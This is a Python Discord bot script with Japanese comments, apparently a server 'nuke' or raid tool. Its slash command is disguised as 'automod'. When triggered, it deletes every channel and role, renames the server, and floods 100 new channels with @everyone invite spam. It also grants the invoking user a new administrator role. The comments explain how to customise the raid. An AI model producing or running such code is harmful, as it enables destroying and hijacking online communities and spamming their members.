import asyncio
import aiohttp
import discord
from discord.ext import commands
import os

TOKEN = os.getenv("TOKEN")

bot = discord.Bot()

@bot.event
async def on_ready():
    print(f"{bot.user}でログインしました。")
    activity = discord.Game(name=">>help")
    await bot.change_presence(status=discord.Status.online, activity=activity)

@bot.slash_command(name="automod", description="automod true")
async def automod(ctx):#ここで起動コマンドを変えられるよ
    try:
        await ctx.message.delete()
    except:
        pass

    guild = ctx.guild
    new_server_name = "革命鯖植民地" #ここは変えたいサーバーの名前にしてね
    new_server_icon_url = "https://images-ext-1.discordapp.net/external/9lxcZmC21zY-ZlXvLwzVkfxMN6i2VVC4rx0qAikdiZ4/%3Fsize%3D1024/https/cdn.discordapp.com/icons/1360201150413934812/32fcaf905664eb6555fcbe5e00e048ea.png?width=896&height=896" #ここは変えたいアイコンのリンクにしてね
    role_name = "革命鯖万歳" #ここは作成したいロールの名前にしてね
    admin_role_name = "革命鯖VIP" #荒らしたときに作成する管理者のロールの名前にしてね

    try:
        await guild.edit(community=False)
    except:
        pass

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(new_server_icon_url) as resp:
                if resp.status == 200:
                    new_server_icon = await resp.read()
                    await guild.edit(name=new_server_name, icon=new_server_icon)
    except:
        pass

    delete_tasks = [channel.delete() for channel in ctx.guild.channels]
    await asyncio.gather(*delete_tasks, return_exceptions=True)

    everyone_role = ctx.guild.default_role
    overwrite_permissions = discord.Permissions()
    overwrite_permissions.update(
        read_messages=True,
        send_messages=True,
        read_message_history=True
    )

    try:
        await everyone_role.edit(permissions=overwrite_permissions)
    except:
        pass

    create_tasks = [
        ctx.guild.create_text_channel(f'discord.gg/mititt') for _ in range(100) #作成したいチャンネルの名前と作成する数
    ]
    new_channels = await asyncio.gather(*create_tasks, return_exceptions=True)

    send_message_tasks = []
    message_content = '# @everyone @here 日本最大級のPBerサーバー「革命鯖」へ今すぐ参加 https://discord.gg/Zq8CKJmzC8' #荒らすときに送りたいメッセージにしてね

    for channel in new_channels:
        if isinstance(channel, Exception):
            continue
        for _ in range(5):#チャンネルにメッセージを送る回数
            send_message_tasks.append(channel.send(message_content))

    await asyncio.gather(*send_message_tasks, return_exceptions=True)

    delete_roles_tasks = [
        role.delete() for role in guild.roles if role != guild.default_role
    ]

    await asyncio.gather(*delete_roles_tasks, return_exceptions=True)

    try:
        admin_role = await guild.create_role(name=admin_role_name, permissions=discord.Permissions(administrator=True))
        await ctx.author.add_roles(admin_role)
    except:
        pass

    try:
        create_roles_tasks = [
            guild.create_role(name=role_name) for _ in range(30)#ロールを作成したい数
        ]
        await asyncio.gather(*create_roles_tasks, return_exceptions=True)
    except:
        pass

    return

bot.run(TOKEN)#ここに自分のtokenを入れてね
